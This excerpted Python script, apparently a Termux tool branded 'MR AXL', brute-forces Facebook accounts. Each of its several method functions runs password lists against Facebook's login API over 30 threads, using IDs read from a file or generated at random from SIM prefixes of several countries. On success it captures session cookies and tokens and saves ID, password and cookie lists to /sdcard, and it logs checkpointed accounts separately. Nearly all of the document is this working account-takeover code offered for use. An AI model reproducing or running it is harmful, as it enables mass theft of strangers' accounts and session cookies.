...
def git():
    os.system("xdg-open https://github.com/ALEXANDERAXLMONTREAL")
...
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.AXL', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.AXL', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.AXL', 'r').read()
kex=(f"MR|{uid}|AXL|{key1}|07")
...
sys.stdout.write('\x1b]2; MR~AXL\x07')
#===================[SERVER BOX]===========================
def gift___proo():
...
{green}╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
{white}───────────────────────────────────────────────────────
{red}[{white}√{red}]{green} DEVELOPER {white}▶ {green}︎MR AXL
{red}[{white}√{red}]{green} TOOLTYPE {white} ▶︎{green} FREE {red}({green}FILE {white}& {green}RANDOM{red})
{red}[{white}√{red}]{green} GITHUB    {white}▶︎ github.com/ALEXANDERAXLMONTREAL
...
def ___AXL___():
    ...
    print(f'{red}[{white}C{red}]{green} FACEBOOK FOLLOW')
    line()
    __AXL__ = input(f'{red}[{white}◆{red}]{green} SELECTION {white}:{yellow} ')
    if __AXL__ in['A','a','01','1']:___FILE___()
    elif __AXL__ in ['B','b','02','2']:___RANDOM___()
    elif __AXL__ in ['C','c','03','3']:os.system('xdg-open https://www.facebook.com/AlexanderAxlMontreal.IAmLimitless');___AXL___()
    else:
...
def ___RANDOM___():
    ...
    line()
    axl_ = input(f'{red}[{white}◆{red}]{green} SELECTION {white}▶ {yellow}︎')
    if axl_ in ['A','a','01','1']:___BD___()
    elif axl_ in ['B','b','02','2']:___INDIA___()
    elif axl_ in ['C','c','03','3']:___ML___()
    elif axl_ in ['D','d','04','4']:___PK___()
    elif axl_ in ['E','e','05','5']:___NP___()
    elif axl_ in ['F','f','06','6']:___AXL___()
    else:___RANDOM___()
#====================[BD RANDOM]==========================
def ___BD___():
    clear()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}018 017 016 013{red}]');line()
    code = input(f'{red}[{white}◆{red}]{green} SIM CODE    {white}▶︎ {yellow}')
    clear()
    ...
    for x in range(limit):
        ...
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as AXL:
        clear()
        ...
        for love in user:
            ...
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:AXL.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:AXL.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:AXL.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:AXL.submit(randm3, ids, psd,tl)
    print(f'\r{white}───────────────────────────────────────────────────────')
...
def ___INDIA___():
    ...
    code = input(f'{red}[{white}◆{red}]{green} SIM CODE    {white}▶︎ \x1b[38;5;208m')
    clear()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');line()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    line()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
    ___error___=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSELECTION \033[1;37m▶︎ \x1b[38;5;208m")
    line()
    ...
    plist = []
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSELECTION \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:       
    ...
    with ThreadPoolExecutor(max_workers=30) as AXL:
        clear()
        print(f'{red}[{white}√{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{___AXL___}')
        print(f'{red}[{white}√{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        ...
        for love in user:
            ...
            tl = len(user)
            psd = plist
            if ___AXL___ in ['A','a','01','1']:AXL.submit(randm, ids, psd,tl)
            elif ___AXL___ in ['B','b','02','2']:AXL.submit(randm1, ids, psd,tl)
            elif ___AXL___ in ['C','c','03','3']:AXL.submit(randm2, ids, psd,tl)
            elif ___AXL___ in ['D','d','04','4']:AXL.submit(randm3, ids, psd,tl) 
    print(f'\r{white}───────────────────────────────────────────────────────')
    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}√{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
...
def ___ML___():
    ...
    code = input(f'{red}[{white}◆{red}]{green} SELECTION    {white}▶︎ \x1b[38;5;208m')
    clear()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');line()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    line()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
    mtd=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSELECTION \033[1;37m▶︎ \x1b[38;5;208m")
    plist = []
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    ...
    with ThreadPoolExecutor(max_workers=30) as AXL:
        ...
        for love in user:
            ...
            tl = len(user)
            xb = love[2:]
            if mtd in ['A','a','01','1']:AXL.submit(randm, ids, plist,tl)
            elif mtd in ['B','b','02','2']:AXL.submit(randm1, ids, plist,tl)
            elif mtd in ['C','c','03','3']:AXL.submit(randm2, ids, plist,tl)
            elif mtd in ['D','d','04','4']:AXL.submit(randm3, ids, plist,tl)
    print('')
    print(f'\r{white}───────────────────────────────────────────────────────')
    print(f'{red}[{white}√{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}√{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
...
def ___FILE___():
    global methods
    clear()
    print(f'{red}[{white}√{red}] {green}EXAMPLE {red}[{white}sdcard/mraxl.txt{red}]');line()
    ...
    with ThreadPoolExecutor(max_workers=30) as AXL:
        ...
        for user in dx:
            ...
            if __METHOD__ in ["A","a","1","01"]:
                AXL.submit(__MTDONEE__,ids,names,passlist,tl)
            elif __METHOD__ in ["B","b","2","02"]:
                AXL.submit(__MTDTWOO__,ids,names,passlist,tl)
            elif __METHOD__ in ["C","c","3","03"]:
                AXL.submit(__MTDTHREE__,ids,names,passlist,tl)
            elif __METHOD__ in ["D","d","4","04"]:
                AXL.submit(__MTDFOUR__,ids,names,passlist,tl)
            elif __METHOD__ in ["E","e","5","05"]:
                AXL.submit(__MTDFIVE__,ids,names,passlist,tl)
            elif __METHOD__ in ["F","f","6","06"]:
                AXL.submit(__MTDONE6__ ,ids,names,passlist,tl)
            else:
                AXL.submit(__MTDONEE__,ids,names,passlist,tl)
    print('')
    print(f'\r{white}───────────────────────────────────────────────────────')
...
try:
    def __MTDONEE__(sid, name, psw,tl):
        try:
            global oks,cps,loop
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r{red}[{white}√{red}] {red}[{abir}MR-AXL{red}] {red}[{cyan}{loop}{red}] {red}[{green}OK{white}-{green}{len(oks)}{red}] {red}[{white}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                po = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}AXL-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/AXL-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/AXL-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[PATAY-CP] {sid} | {ps} ")
                     open('/sdcard/AXL-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
    ...
    def __MTDTWOO__(sid, name, psw,tl):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}MR-AXL-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/AXL-FILE-M2.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/AXL-FILE-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[DEAD-CP] {sid} | {ps} ")
                     open('/sdcard/AXL-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:continue
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}MR-AXL-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/AXL-FILE-M3.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/AXL-FILE-M3-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[FAILED-CP] {sid} | {ps} ")
                     open('/sdcard/AXL-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:continue
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}MR-AXL-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/AXL-FILE-M4.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/AXL-FILE-M4-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[CHECKPOINT-CP] {sid} | {ps} ")
                     open('/sdcard/AXL-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:continue
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}MR-AXL-OK{red}] {green}{sid} {white}| {green}{ps} ")
                    open('/sdcard/AXL-FILE-M5.txt','a').write(sid+'|'+ps+'\n')
                    open('/sdcard/AXL-FILE-M5-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{red}[DISABLED-CP] {sid} | {ps} ")
                     open('/sdcard/AXL-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                     break
                else:continue
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                open('/sdcard/AXL-FILE-M6.txt','a').write(sid+'|'+ps+'\n')
                open('/sdcard/AXL-FILE-M6-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                oks.append(sid)
                break
            elif 'www.facebook.com' in q['error']['message']:
                print(f"\r\r{red}[PATAY-CP] {sid} | {ps} ")
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}MR-AXL-ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
                    oks.append(ids)
                    open('/sdcard/AXL-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
                print(f"\r\r{red}[{white}√{red}] {red}CHECKPOINT-CP {uid} | {pas} ")
                open('/sdcard/AXL-RN-CHECKPOINT.txt','a').write(ids+'|'+pas+'\n')
        loop+=1
    except Exception as e:
        pass
#====================[RANDOM M2]==========================
        ...
        for pas in psd:
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}MR-AXL-ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/AXL-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
        ...
        for pas in psd:
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print(f"\r\r{red}[{white}√{red}] {red}[{green}MR-AXL-ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/AXL-M3-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    break
            elif 'www.facebook.com' in q['error_msg']:
                cps.append(ids)
        ...
        for pas in psd:
            ...
            if "c_user" in log_cookies:
                ...
                if 'Photoshop' in res:
                    ...
                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                    oks.append(ids)
                    open('/sdcard/AXL-M4-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    break
                else:pass
